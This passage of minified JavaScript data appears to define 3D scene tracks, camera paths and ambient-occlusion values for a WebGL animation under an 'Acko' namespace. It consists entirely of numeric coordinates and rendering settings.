ull,0],[_v(-550,25,-400),null,160],[_v(-550,25,-250),null,0],[_v(-550,25,-50),null,160,12],[_v(-380,25,-50),null,0],[_v(-340,25,-50),null,30],[_v(-285,65,-50),null,30],[_v(-235,65,-50),null,0],[_v(-120,65,-50),null,0],[_v(110,65,-50),null,50,10],[_v(180,30,-80),null,50,10],[_v(500,20,-80),null,160,26],[_v(500,20,230),null,160,12],[_v(700,20,260),null,0],[_v(1000,20,260),null,160,16],[_v(1000,250,260),null,0],[_v(1000,550,260),null,0],],travel:-2102,length:6498,travelOverride:-2099-15000,lengthOverride:4678+15000+465,travelAO:200,lengthAO:2800,smooth:4,up:_v(-1,0,0),detail:8,color:Acko.Palette.slate[0],AOStep:35,simplify:false,receiveAO:0.85,castAO:0.5,},{n:8,power:0.2,width:35,height:15,relative:_v(10,0,0),points:[[_v(-550,600,-400),null,0],[_v(-550,250,-400),null,0],[_v(-550,25,-400),null,160],[_v(-550,25,-250),null,0],[_v(-550,25,-50),null,160,12],[_v(-380,25,-50),null,0],[_v(-340,25,-50),null,30],[_v(-285,65,-50),null,30],[_v(-235,65,-50),null,0],[_v(-120,65,-50),null,0],[_v(110,65,-50),null,50,10],[_v(180,30,-80),null,50,10],[_v(500,20,-80),null,160,26],[_v(500,20,230),null,160,12],[_v(700,20,260),null,0],[_v(1000,20,260),null,160,16],[_v(1000,250,260),null,0],[_v(1000,550,260),null,0],],travel:-2100,length:6500,travelOverride:-2100-15000,lengthOverride:4680+15000+480,travelAO:200,lengthAO:2800,smooth:4,up:_v(-1,0,0.4),detail:8,color:Acko.Palette.slate[0],simplify:false,receiveAO:0.85,castAO:0.85,},{n:8,power:0.2,width:30,height:5,relative:_v(0,0,0),points:[[_v(-350,775,-440),null,0],[_v(-350,500,-440),null,0],[_v(-350,280,-440),null,60,10],[_v(-350,280,-115),null,130,18],[_v(-400,-40,-233),null,50,12],[_v(-400,-67,-123),null,150,12],[_v(35,-58,-125),null,100,14],[_v(-37,291,-125),null,100,12],[_v(162,235,-135),null,100],[_v(347,275,-135),null,120,14],[_v(357,300,-365),null,100],[_v(367,140,-335),null,50],[_v(520,160,-250),null,50],[_v(720,70,-260),null,160,12],[_v(690,110,-60),null,160,12],[_v(675,200,100),null,160,10],[_v(870,250,20),null,100,10],[_v(1070,250,-40),null,100,12],[_v(1070,420,-40),null,0],[_v(1070,620,-40),null,0],],travel:-950,length:4950,travelOverride:-950-15000,lengthOverride:4450+15000*2,travelAO:350,lengthAO:3350,smooth:8,castAO:0.9,up:_v(-0.1,0,1),detail:8,color:Acko.Palette.blue[1],},{n:8,power:0.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1100,100,-240),null,0],[_v(-900,140,-340),null,100,8],[_v(-700,140,-340),null,100,8],[_v(-600,170,-240),null,100,9],[_v(-440,170,-340),null,100,12],[_v(-320,180,-380),null,100,10],[_v(-260,100,-265),null,100,10],[_v(-420,-15,-225),null,100,10],[_v(-380,-50,-5),null,100,10],[_v(-200,-40,-5),null,100,14],[_v(-160,-5,-220),null,100,10],[_v(-50,-30,-240),null,60,10],[_v(-50,130,-220),null,60,10],[_v(85,130,-220),null,60,8],[_v(100,160,-140),null,60,8],[_v(185,240,-110),null,60,8],[_v(350,210,-110),null,100],[_v(600,280,-120),null,150,12],[_v(700,240,-120),null,150,12],[_v(750,350,50),null,100,10],[_v(800,450,800),null,250,10],[_v(800,750,800),null,0],[_v(800,1200,800),null,0],[_v(800,2200,800),null,0],[_v(800,2400,800),null,100,10],[_v(800,2600,800),null,100,20],[_v(800,2800,800),null,100,10],[_v(800,3000,800),null,0],],travel:-478,length:4850,lengthOverride:3420,travelAO:50,lengthAO:2800,smooth:5,castAO:1.2,up:_v(0,0.2,1),detail:8,color:Acko.Palette.blue[0],},{n:8,power:0.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1200,145,-145),null,0],[_v(-850,145,-205),null,100],[_v(-660,165,-205),null,100],[_v(-500,100,-125),null,100],[_v(-220,135,-135),null,100,18],[_v(-280,30,-165),null,100,10],[_v(-280,32,-370),null,100,16],[_v(50,52,-370),null,100],[_v(90,70,-260),null,100],[_v(200,80,-265),null,50,18],[_v(230,180,-260),null,50,10],[_v(220,140,-120),null,50],[_v(290,50,-115),null,50],[_v(380,70,-95),null,100],[_v(430,150,-100),null,100],[_v(550,150,-50),null,100,10],[_v(500,100,150),null,250,10],[_v(550,100,250),null,250],[_v(600,170,260),null,250],[_v(800,150,100),null,250,16],[_v(800,350,100),null,0],[_v(800,750,100),null,0],],travel:-40,length:4500,lengthOverride:4000+15000,travelAO:200,lengthAO:2800,smooth:8,up:_v(0,-0.3,1),detail:8,color:Acko.Palette.slate[0],},{n:8,power:0.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1200,180,-230),null,0],[_v(-800,180,-260),null,100],[_v(-550,55,-220),null,100],[_v(-330,20,-440),null,100],[_v(-240,195,-430),null,100],[_v(-200,215,-60),null,100],[_v(0,140,-50),null,60],[_v(0,60,-200),null,60,10],[_v(-30,-75,-100),null,100],[_v(100,-95,-120),null,100],[_v(170,90,-155),null,50],[_v(250,200,10),null,50],[_v(450,200,0),null,100],[_v(450,200,190),null,100],[_v(700,200,200),null,0],[_v(1000,200,200),null,160],[_v(1000,450,200),null,0],[_v(1000,1200,200),null,0],],travel:-75,length:4500,lengthOverride:3550+15000,lengthAO:3000,castAO:1,receiveAO:1.2,smooth:8,up:_v(0,-0.3,1),detail:8,color:Acko.Palette.slate[1],},{n:8,power:0.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1200,60,-50),null,0],[_v(-800,60,-124),null,100],[_v(-600,100,-80),null,100],[_v(-350,90,-100),null,50],[_v(-320,-10,-200),null,50],[_v(-320,-10,-430),null,150],[_v(-120,110,-420),null,100],[_v(100,110,-420),null,100],[_v(30,200,-200),null,100],[_v(200,230,-180),null,100],[_v(500,100,-160),null,100],[_v(660,205,-220),null,100],[_v(820,205,-200),null,150,12],[_v(880,205,0),null,0],[_v(850,205,100),null,160],[_v(850,505,100),null,0],[_v(850,1200,100),null,0],],travel:-188,length:4700,lengthOverride:3110,lengthAO:2800,smooth:8,up:_v(0,1,-1.5),detail:8,color:Acko.Palette.red[2],},{n:8,power:0.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-798,600,-420),null,0],[_v(-798,250,-420),null,0],[_v(-798,40,-420),null,120,14],[_v(-798,35,-220),null,100,12],[_v(-849,-35,-30),null,100,11],[_v(-650,80,-30),null,100,8],[_v(-502,80,-30),null,100,9],[_v(-507,200,-60),null,100,11],[_v(-597,200,-197),null,100,14],[_v(-397,180,-347),null,100,16],[_v(-250,300,-250),null,100,8],[_v(-30,230,-225),null,100,12],[_v(50,280,-350),null,100,12],[_v(150,260,-350),null,100,8],[_v(150,120,-150),null,100,9],[_v(180,210,-2),null,100,9],[_v(300,250,-50),null,100,10],[_v(480,300,-350),null,150,16],[_v(850,250,-150),null,100,14],[_v(1100,250,-150),null,100,10],[_v(1100,450,-150),null,0],[_v(1100,1250,-150),null,0],],travel:-470,length:4800,travelOverride:-470-15000,lengthOverride:4600+15000+15000,travelAO:200,lengthAO:3650,smooth:8,castAO:0.8,receiveAO:0.9,up:_v(-0.69,0,1),detail:8,color:Acko.Palette.platinum[1],},{n:16,power:0.5,width:80,height:60,relative:_v(100,-200,0),points:[[_v(-2800,300,80),null,0],[_v(0,300,-820),null,1000],[_v(2800,300,80),null,0],],travel:-400,length:6200,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:false,speed:1200,distance:5800,castAO:false,receiveAO:false,},{n:16,power:0.5,width:40,height:50,relative:_v(100,-200,0),points:[[_v(-2800,450,80),null,0],[_v(0,450,-820),null,1000],[_v(2800,450,80),null,0],],travel:-400,length:6200,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:false,speed:1200,distance:5800,castAO:false,receiveAO:false,},{n:1,power:0.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,-215,600),null,0],[_v(500,-115,600),null,0],],travel:-10000,length:0,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:false,castAO:false,receiveAO:false,dead:true,},{n:1,power:0.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,565,0),null,0],[_v(500,565,0),null,0],],travel:-10000,length:0,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:false,castAO:false,receiveAO:false,dead:true,},{n:1,power:0.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,445,0),null,0],[_v(500,445,0),null,0],],travel:-10000,length:0,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:false,castAO:false,receiveAO:false,dead:true,},{n:1,power:0.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,-185,120),null,0],[_v(500,-205,40),null,0],],travel:-10000,length:0,smooth:0,up:_v(0,0.7,1),detail:16,color:Acko.Palette.platinum[1],warp:false,castAO:false,receiveAO:false,dead:true,},];Acko.CameraRides=[[16,true,-550,1250+3,0.01,1,0.08,false,[-200,400,-1000],true],[4,true,-296+3,2560,27,1.4,0.06],[13,true,150,3658-7,20,1.4,0.08],[2,false,271-7,1845,28,1.4,0.08],[8,true,550,2668+427-318,13,1.4,0.1],[10,false,355-16,2867-320+318,19,1.4,0.08,true],[11,false,786,3648-16,24,1.5,0.08,true],[6,false,700,2287+12+7,30,1.4,0.08],[6,true,670+12,1911-7,30,1.4,0.08,true],[17,true,-625-5,1308,0.01,1.2,0.08,true,[400,-400,-200],true],[2,true,700,2290-5,28,1.4,0.08,true],[13,false,872,3413,20,1.4,0.08,true],[8,true,589,2816,13,1.4,0.1,true],[4,true,460,2662,27,1.4,0.06,true],[11,false,-7+13,2855+13,24,1.5,0.08],[10,false,299+10,3002+10,19,1.4,0.08],[9,true,1035-335-3,2751+335,14,1.5,0.08,true],[19,true,-785-15,460+5,0.05,1.2,0.08,false,[50,150,-170],true],[18,false,180+15,1463-5,0.01,1.2,0.08,true,[-100,-400,-100],true],[2,false,1050,2324,28,1.4,0.08,true],[9,true,475-15,2377-15,14,1.5,0.08,false],[12,true,920-10,2174,13,1.4,0.08,true],[10,true,260+10,2040,18,1.4,0.08],[8,false,1452,6000,13,1.4,0.08],];Acko.AOData="[[953,2129,40,16.6,[[-433,6.05,-11.1,0.074,0.407,-0.910,0.505,0],[-435,36.0,2.05,0.074,0.407,-0.910,0.543,0],[-390,10.1,-6.48,0.017,0.395,-0.918,0.587,0.009],[-399,39.4,5.97,0.017,0.395,-0.918,0.532,0],[-349,35.1,-1.59,-0.195,0.270,-0.942,0.694,0.050],[-373,55.0,9.04,-0.195,0.270,-0.942,0.538,0.004],[-325,70.1,1.20,-0.239,0.212,-0.947,0.570,0.075],[-352,85.7,11.5,-0.239,0.212,-0.947,0.420,0.031],[-305,103,3.65,-0.224,0.227,-0.946,0.390,0.096],[-331,120,13.9,-0.224,0.227,-0.946,0.273,0.053],[-282,121,6.14,-0.012,0.383,-0.922,0.273,0.122],[-292,150,18.2,-0.012,0.383,-0.922,0.115,0.052],[-254,121,9.18,0.251,0.366,-0.894,0.257,0.110],[-243,148,23.4,0.251,0.366,-0.894,0.115,0.057],[-245,100,9.92,0.490,0.035,-0.870,0.462,0.110],[-217,102,26.0,0.490,0.035,-0.870,0.388,0.060],[-244,61.6,9.80,0.492,0.018,-0.870,0.728,0.076],[-215,61.8,25.9,0.492,0.018,-0.870,0.639,0.049],[-244,22.6,8.09,0.494,0.096,-0.862,0.690,0.090],[-215,20.8,24.2,0.494,0.096,-0.862,0.627,0.062],[-244,4.59,-7.81,0.492,0.870,0.008,0.302,0.603],[-215,-11.5,-7.78,0.492,0.870,0.008,0.228,0.594],[-243,7.78,-47.1,0.489,0.863,0.119,0.478,0.608],[-215,-8.31,-48.1,0.489,0.863,0.119,0.383,0.342],[-239,13.0,-89.0,0.477,0.854,0.203,0.558,0.559],[-211,-3.58,-85.2,0.477,0.854,0.203,0.516,0.414],[-203,15.4,-128,0.173,0.834,0.522,0.325,0.587],[-197,-2.59,-101,0.173,0.834,0.522,0.417,0.534],[-163,12.0,-133,0.203,0.832,0.512,0.218,0.450],[-158,-5.80,-106,0.203,0.832,0.512,0.288,0.554],[-147,10.4,-149,0.597,0.791,0.119,0.242,0.320],[-122,-9.53,-143,0.597,0.791,0.119,0.191,0.269],[-143,10.1,-186,0.612,0.789,0.034,0.218,0.138],[-117,-10,-185,0.612,0.789,0.034,0.217,0.113],[-140,10,-227,0.606,0.791,0.068,0.248,0.098],[-114,-10,-224,0.606,0.791,0.068,0.268,0.065],[-116,10,-271,0.243,0.791,0.559,0.215,0.015],[-105,-10,-248,0.243,0.791,0.559,0.226,0.038],[-70.4,10.8,-273,-0.141,0.784,0.603,0.196,0.024],[-72.6,-9.37,-247,-0.141,0.784,0.603,0.261,0.014],[-42.8,18.4,-270,-0.512,0.616,0.597,0.184,0.112],[-26.2,7.08,-244,-0.512,0.616,0.597,0.218,0.124],[-37.4,45.0,-280,-0.661,0.280,0.695,0.216,0.356],[-12.8,52.3,-259,-0.661,0.280,0.695,0.208,0.296],[-38.2,81.5,-294,-0.661,0.244,0.708,0.116,0.523],[-13.6,90.3,-274,-0.661,0.244,0.708,0.072,0.416],[-40.3,119,-308,-0.659,0.203,0.723,0.120,0.488],[-15.7,127,-288,-0.659,0.203,0.723,0.063,0.422],[-41.9,160,-317,-0.655,0.091,0.749,0.137,0.296],[-17.1,164,-296,-0.655,0.091,0.749,0.105,0.218],[-42.3,201,-320,-0.654,0.011,0.756,0.109,0.080],[-17.5,202,-299,-0.654,0.011,0.756,0.135,0.122],[-42.4,242,-320,-0.654,0.001,0.756,0.147,0.067],[-17.5,242,-299,-0.654,0.001,0.756,0.176,0.119],[-42.4,282,-320,-0.654,0,0.756,0.175,0.068],[-17.5,282,-299,-0.654,0,0.756,0.192,0.113],[-42.4,322,-320,-0.654,0,0.756,0.071,0.068],[-17.5,322,-299,-0.654,0,0.756,0.132,0.105],[-42.4,362,-320,-0.654,0,0.756,0,0.061],[-17.5,362,-299,-0.654,0,0.756,0.017,0.112]]],null,[713,1979,35,17.4,[[-310,156,-183,-0.127,-0.338,-0.932,0.078,0.490],[-292,181,-195,-0.127,-0.338,-0.932,0.181,0.315],[-277,138,-179,-0.053,-0.377,-0.924,0.232,0.426],[-264,166,-192,-0.053,-0.377,-0.924,0.216,0.264],[-239,128,-176,0.032,-0.401,-0.915,0.371,0.437],[-235,158,-189,0.032,-0.401,-0.915,0.365,0.282],[-203,126,-173,0.061,-0.403,-0.912,0.432,0.475],[-201,156,-186,0.061,-0.403,-0.912,0.357,0.305],[-168,125,-170,0.074,-0.404,-0.911,0.359,0.557],[-167,155,-183,0.074,-0.404,-0.911,0.347,0.402],[-133,125,-166,0.093,-0.405,-0.909,0.257,0.568],[-132,155,-180,0.093,-0.405,-0.909,0.251,0.561],[-99.5,125,-162,0.162,-0.407,-0.896,0.141,0.529],[-97.1,154,-175,0.162,-0.407,-0.896,0.137,0.569],[-70.5,125,-151,0.595,-0.407,-0.692,0.040,0.523],[-61.8,154,-161,0.595,-0.407,-0.692,0.045,0.531],[-56.0,124,-124,0.891,-0.405,-0.199,0.178,0.453],[-43.0,155,-127,0.891,-0.405,-0.199,0.185,0.469],[-50.2,124,-90.8,0.906,-0.405,-0.118,0.302,0.424],[-37.0,155,-92.6,0.906,-0.405,-0.118,0.378,0.453],[-46.4,124,-56.4,0.910,-0.405,-0.074,0.346,0.372],[-33.2,155,-57.5,0.910,-0.405,-0.074,0.461,0.447],[-45.0,125,-22.0,0.911,-0.407,0.009,0.285,0.342],[-31.6,154,-21.9,0.911,-0.407,0.009,0.322,0.480],[-51.4,125,7.24,0.717,-0.408,0.562,0.197,0.383],[-40.9,154,15.5,0.717,-0.408,0.562,0.148,0.237],[-77.7,124,19.1,0.118,-0.407,0.905,0.071,0.389],[-76.2,154,32.4,0.118,-0.407,0.905,0.039,0.231],[-110,123,20.1,0.007,-0.404,0.913,0.079,0.296],[-113,153,33.3,0.007,-0.404,0.913,0.039,0.167],[-134,116,18.9,0.209,-0.313,0.925,0.074,0.256],[-154,139,31.2,0.209,-0.313,0.925,0.035,0.146],[-142,95.3,18.3,0.351,-0.046,0.934,0.089,0.330],[-173,98.6,30,0.351,-0.046,0.934,0.047,0.300],[-142,63.8,18.4,0.348,0.050,0.935,0.083,0.538],[-173,60.2,29.9,0.348,0.050,0.935,0.050,0.525],[-134,42.9,18.9,0.194,0.324,0.924,0.073,0.676],[-153,19.2,31.3,0.194,0.324,0.924,0.039,0.674],[-109,37.3,20,-0.003,0.406,0.913,0.083,0.642],[-111,7.43,33.3,-0.003,0.406,0.913,0.043,0.564],[-75.1,35.9,21.2,-0.024,0.407,0.912,0.070,0.536],[-75.9,6.00,34.6,-0.024,0.407,0.912,0.036,0.422],[-40.8,36.3,22.3,-0.036,0.406,0.912,0.078,0.509],[-40.3,6.33,35.6,-0.036,0.406,0.912,0.028,0.331],[-8.03,38.7,23.1,-0.079,0.398,0.912,0.095,0.432],[-3.43,9.08,36.4,-0.079,0.398,0.912,0.037,0.233],[8.71,48.1,23.1,-0.369,0.172,0.912,0.069,0.462],[36.0,35.7,36.5,-0.369,0.172,0.912,0.030,0.357],[13.1,77.1,22.9,-0.409,0.030,0.911,0.076,0.555],[43.0,75.3,36.4,-0.409,0.030,0.911,0.038,0.481],[14.4,111,22.6,-0.410,0.021,0.911,0.081,0.524],[44.3,110,36.1,-0.410,0.021,0.911,0.036,0.366],[14.9,146,21.8,-0.411,0.035,0.910,0.069,0.403],[44.8,146,35.3,-0.411,0.035,0.910,0.028,0.372],[15.2,180,19.6,-0.412,0.122,0.900,0.032,0.474],[45.0,181,33.1,-0.412,0.122,0.900,0.013,0.382],[15.8,205,6.77,-0.390,0.790,0.470,0.002,0.413],[46.0,216,14.6,-0.390,0.790,0.470,0,0.314],[17.1,212,-24.1,-0.368,0.928,0.049,0.048,0.417],[47.6,224,-22.1,-0.368,0.928,0.049,0.049,0.323],[18.2,213,-58.6,-0.366,0.929,0.013,0.193,0.310],[48.8,225,-57.5,-0.366,0.929,0.013,0.510,0.249],[19.1,214,-93.5,-0.367,0.928,0.022,0.666,0.254],[49.6,226,-92.5,-0.367,0.928,0.022,0.692,0.171],[19.7,216,-128,-0.370,0.917,0.102,0.688,0.235],[50,228,-127,-0.370,0.917,0.102,0.673,0.160],[19.7,232,-163,-0.371,0.582,0.720,0.444,0.250],[50.2,239,-154,-0.371,0.582,0.720,0.381,0.232],[19.7,268,-175,-0.369,0.076,0.925,0.208,0.368],[50.2,269,-163,-0.369,0.076,0.925,0.238,0.254],[19.7,304,-176,-0.369,0.002,0.929,0.105,0.188],[50.2,304,-164,-0.369,0.002,0.929,0.145,0.139],[19.7,339,-176,-0.369,0,0.929,0.048,0.131],[50.2,339,-164,-0.369,0,0.929,0.070,0.087]]],null,[343,2524,50,18.7,[[15.0,457,-273,-0.410,0,-0.911,0,0],[44.9,457,-286,-0.410,0,-0.911,0.004,0],[15.0,407,-273,-0.410,0,-0.911,0.002,0.012],[44.9,407,-286,-0.410,0,-0.911,0.029,0],[15.0,357,-273,-0.410,0,-0.911,0.008,0.123],[44.9,357,-286,-0.410,0,-0.911,0.067,0.115],[15.0,307,-273,-0.410,0,-0.911,0.010,0.324],[44.9,307,-286,-0.410,0,-0.911,0.087,0.310],[15.0,257,-273,-0.410,0,-0.911,0.012,0.400],[44.9,257,-286,-0.410,0,-0.911,0.089,0.363],[15.0,206,-273,-0.410,-0,-0.911,0.026,0.252],[44.9,207,-286,-0.410,-0,-0.911,0.089,0.274],[15.0,156,-273,-0.410,-0,-0.911,0.072,0.077],[45.0,157,-286,-0.410,-0,-0.911,0.246,0.099],[15.2,106,-273,-0.410,-0.002,-0.911,0.358,0.078],[45.1,107,-286,-0.410,-0.002,-0.911,0.381,0.143],[16.0,56.5,-273,-0.408,-0.011,-0.912,0.322,0.190],[45.9,57.4,-286,-0.408,-0.011,-0.912,0.360,0.198],[23.2,1.83,-273,-0.377,-0.150,-0.913,0.112,0.109],[50.9,13.4,-287,-0.377,-0.150,-0.913,0.128,0.196],[75.1,-33.2,-274,-0.073,-0.382,-0.920,0.052,0.277],[79.0,-3.24,-287,-0.073,-0.382,-0.920,0.102,0.284],[123,-35.0,-269,0.428,-0.398,-0.807,0.020,0.238],[129,-4.97,-280,0.428,-0.398,-0.807,0.046,0.243],[141,-35.0,-232,0.916,-0.394,-0.063,0.004,0.297],[153,-4.89,-233,0.916,-0.394,-0.063,0.058,0.272],[142,-34.9,-182,0.919,-0.394,-0.010,0.162,0.345],[155,-4.77,-182,0.919,-0.394,-0.010,0.202,0.323],[142,-34.6,-132,0.919,-0.393,0.003,0.342,0.435],[155,-4.46,-132,0.919,-0.393,0.003,0.403,0.393],[142,-33.9,-82.6,0.918,-0.392,0.019,0.369,0.496],[155,-3.79,-83.0,0.918,-0.392,0.019,0.454,0.408],[141,-32.2,-32.2,0.916,-0.386,0.071,0.093,0.194],[154,-2.07,-33.5,0.916,-0.386,0.071,0.213,0.252],[129,-17.2,18.7,0.715,-0.135,0.684,0.030,0.148],[145,8.44,6.63,0.715,-0.135,0.684,0.079,0.283],[97.1,23.4,34.1,0.424,0.227,0.876,0.031,0.311],[119,41.9,18.6,0.424,0.227,0.876,0.090,0.458],[70.8,75.6,36.2,0.483,0.015,0.874,0.037,0.448],[99.5,76.7,20.3,0.483,0.015,0.874,0.071,0.471],[100,129,34.8,0.325,-0.340,0.882,0.034,0.301],[118,106,19.4,0.325,-0.340,0.882,0.072,0.323],[153,151,31.4,0.122,-0.429,0.894,0.023,0.139],[156,122,17.0,0.122,-0.429,0.894,0.060,0.186],[205,154,26.9,0.089,-0.433,0.896,0.017,0.163],[204,124,12.7,0.089,-0.433,0.896,0.029,0.294],[255,154,22.2,0.085,-0.432,0.897,0.038,0.150],[253,124,8.07,0.085,-0.432,0.897,0.072,0.274],[305,153,17.1,0.070,-0.430,0.899,0.086,0.313],[302,123,3.21,0.070,-0.430,0.899,0.117,0.420],[360,123,11.0,-0.303,-0.139,0.942,0.095,0.336],[330,113,0.151,-0.303,-0.139,0.942,0.097,0.373],[363,67.5,10.6,-0.324,0.033,0.945,0.078,0.354],[333,69.8,-0.075,-0.324,0.033,0.945,0.106,0.390],[333,13.3,14.1,-0.070,0.395,0.915,0.039,0.237],[320,40.4,1.43,-0.070,0.395,0.915,0.085,0.374],[278,6.09,20.2,0.091,0.433,0.896,0.045,0.202],[276,35.7,6.13,0.091,0.433,0.896,0.090,0.360],[223,12.0,25.9,0.258,0.395,0.881,0.037,0.348],[233,39.1,10.6,0.258,0.395,0.881,0.066,0.446],[196,69.9,26.6,0.506,0.157,0.845,0.060,0.446],[224,67.9,10,0.506,0.157,0.845,0.084,0.447],[195,105,-15.6,0.501,0.862,0.071,0.196,0.377],[224,89.3,-16.8,0.501,0.862,0.071,0.079,0.397],[196,107,-66.2,0.500,0.865,0.021,0.285,0.269],[224,91.2,-66.0,0.500,0.865,0.021,0.248,0.292],[198,108,-117,0.497,0.866,0.034,0.400,0.281],[226,91.6,-115,0.497,0.866,0.034,0.416,0.350],[213,107,-173,0.393,0.871,0.290,0.491,0.290],[235,91.2,-154,0.393,0.871,0.290,0.426,0.291],[267,104,-197,0.126,0.884,0.449,0.567,0.396],[271,89.4,-169,0.126,0.884,0.449,0.487,0.211],[317,102,-204,0.083,0.886,0.455,0.356,0.126],[320,87.1,-175,0.083,0.886,0.455,0.317,0.079],[369,100,-207,-0.025,0.889,0.453,0.432,0.076],[367,85.7,-178,-0.025,0.889,0.453,0.459,0.048],[416,109,-170,-0.637,0.768,-0.044,0.480,0.426],[392,90,-159,-0.637,0.768,-0.044,0.477,0.402],[421,122,-120,-0.656,0.735,-0.167,0.524,0.533],[396,101,-114,-0.656,0.735,-0.167,0.524,0.536],[422,135,-71.3,-0.657,0.732,-0.176,0.538,0.361],[397,114,-66.0,-0.657,0.732,-0.176,0.509,0.368],[422,145,-21.5,-0.657,0.744,-0.119,0.561,0.166],[397,124,-18.1,-0.657,0.744,-0.119,0.580,0.159],[422,149,29.6,-0.656,0.753,-0.018,0.388,0.044],[397,128,30.2,-0.656,0.753,-0.018,0.345,0.017],[422,150,79.8,-0.656,0.753,-0.005,0.130,0.033],[397,129,80,-0.656,0.753,-0.005,0.170,0.015]]],null,[200,3000,35,7.5,[[-540,399,-426,1,0,0,0.028,0.130],[-540,400,-405,1,0,0,0.124,0.029],[-540,364,-426,1,0,0,0.029,0.092],[-540,365,-405,1,0,0,0.090,0.031],[-540,329,-426,1,0,0,0.029,0.082],[-540,330,-405,1,0,0,0.080,0.030],[-540,294,-426,1,0,0,0.032,0.129],[-540,295,-405,1,0,0,0.123,0.034],[-540,259,-426,1,0,0,0.030,0.110],[-540,260,-404,1,0,0,0.103,0.048],[-540,224,-425,1,0,0,0.025,0.119],[-540,225,-404,1,0,0,0.069,0.088],[-540,189,-425,1,0,0,0.026,0.188],[-540,190,-404,1,0,0,0.113,0.153],[-540,154,-424,1,0,0,0.028,0.243],[-540,155,-403,1,0,0,0.123,0.197],[-540,119,-423,1,0,0,0.028,0.198],[-540,120,-402,1,0,0,0.085,0.192],[-540,84.0,-421,1,0,0,0.026,0.142],[-540,86.2,-400,1,0,0,0.137,0.159],[-540,45.7,-410,1,0,0,0.024,0.145],[-540,57.7,-392,1,0,0,0.148,0.111],[-540,22.1,-376,0.999,-0,-0,0.030,0.075],[-539,42.8,-370,0.999,-0,-0,0.184,0.103],[-539,17.1,-339,0.999,0,-0.001,0.080,0.108],[-539,38.4,-338,0.999,0,-0.001,0.175,0.107],[-539,15.6,-304,0.999,0,-0.003,0.093,0.153],[-539,37.0,-303,0.999,0,-0.003,0.235,0.083],[-539,14.9,-269,0.999,0,-0.006,0.049,0.113],[-539,36.3,-268,0.999,0,-0.006,0.137,0.043],[-539,14.5,-234,0.999,0,-0.012,0.131,0.121],[-539,36.0,-233,0.999,0,-0.012,0.265,0.104],[-538,14.3,-198,0.999,0,-0.023,0.173,0.162],[-538,35.8,-198,0.999,0,-0.023,0.311,0.161],[-537,14.3,-163,0.997,0,-0.048,0.171,0.153],[-537,35.7,-163,0.997,0,-0.048,0.324,0.137],[-534,14.3,-129,0.987,0,-0.135,0.214,0.248],[-534,35.6,-129,0.987,0,-0.135,0.261,0.186],[-524,14.2,-95.9,0.849,0,-0.526,0.283,0.342],[-524,35.7,-95.9,0.849,0,-0.526,0.371,0.339],[-498,14.2,-72.5,0.460,0,-0.886,0.339,0.331],[-498,35.7,-72.5,0.460,0,-0.886,0.474,0.299],[-465,14.2,-61.9,0.213,0,-0.976,0.329,0.325],[-465,35.7,-61.9,0.213,0,-0.976,0.457,0.308],[-431,14.3,-55.7,0.154,0,-0.988,0.294,0.392],[-431,35.7,-55.7,0.154,0,-0.988,0.414,0.393],[-396,14.3,-50.7,0.133,0,-0.991,0.354,0.447],[-396,35.7,-50.7,0.133,0,-0.991,0.487,0.448],[-361,14.6,-46.3,0.121,0,-0.992,0.444,0.395],[-362,36.0,-46.3,0.121,0,-0.992,0.581,0.433],[-323,19.4,-41.8,0.115,-0,-0.993,0.494,0.290],[-331,39.3,-42.7,0.115,-0,-0.993,0.583,0.341],[-292,38.9,-38.2,0.112,-0.001,-0.993,0.510,0.340],[-304,56.7,-39.6,0.112,-0.001,-0.993,0.595,0.274],[-264,52.2,-35.2,0.103,-0.004,-0.994,0.499,0.436],[-269,73.2,-35.8,0.103,-0.004,-0.994,0.562,0.298],[-232,53.8,-32.8,0.060,-0.008,-0.998,0.496,0.624],[-232,75.2,-33.0,0.060,-0.008,-0.998,0.462,0.509],[-197,54.0,-30.8,0.049,-0.008,-0.998,0.438,0.701],[-197,75.5,-31.0,0.049,-0.008,-0.998,0.442,0.583],[-162,54.1,-29.2,0.042,-0.008,-0.999,0.345,0.743],[-162,75.5,-29.4,0.042,-0.008,-0.999,0.432,0.596],[-127,54.1,-27.8,0.038,-0.008,-0.999,0.312,0.612],[-127,75.5,-28.0,0.038,-0.008,-0.999,0.353,0.484],[-92.3,54.1,-26.5,0.033,-0.008,-0.999,0.307,0.409],[-92.2,75.5,-26.7,0.033,-0.008,-0.999,0.312,0.286],[-57.3,54.0,-25.5,0.028,-0.008,-0.999,0.350,0.389],[-57.2,75.5,-25.7,0.028,-0.008,-0.999,0.326,0.228],[-22.3,53.9,-24.5,0.023,-0.008,-0.999,0.326,0.441],[-22.2,75.4,-24.7,0.023,-0.008,-0.999,0.344,0.343],[12.5,53.7,-23.9,0.015,-0.007,-0.999,0.287,0.571],[12.7,75.2,-24.1,0.015,-0.007,-0.999,0.292,0.560],[47.5,53.5,-23.5,0.004,-0.007,-0.999,0.239,0.637],[47.8,74.9,-23.6,0.004,-0.007,-0.999,0.319,0.653],[82.3,52.8,-23.8,-0.025,-0.004,-0.998,0.246,0.628],[82.9,74.1,-23.9,-0.025,-0.004,-0.998,0.321,0.613],[115,49.7,-27.0,-0.217,0.017,-0.975,0.153,0.558],[119,70.7,-27.6,-0.217,0.017,-0.975,0.173,0.452],[145,40,-37.2,-0.362,0.057,-0.930,0.247,0.435],[152,60,-38.8,-0.362,0.057,-0.930,0.308,0.358],[176,27.8,-49.7,-0.316,0.042,-0.947,0.292,0.397],[182,48.3,-50.9,-0.316,0.042,-0.947,0.389,0.340],[211,20.5,-58.4,-0.159,0.008,-0.987,0.208,0.330],[213,41.9,-58.6,-0.159,0.008,-0.987,0.298,0.326],[246,18.1,-63.2,-0.119,0.004,-0.992,0.307,0.317],[247,39.5,-63.2,-0.119,0.004,-0.992,0.311,0.285],[281,16.6,-67.2,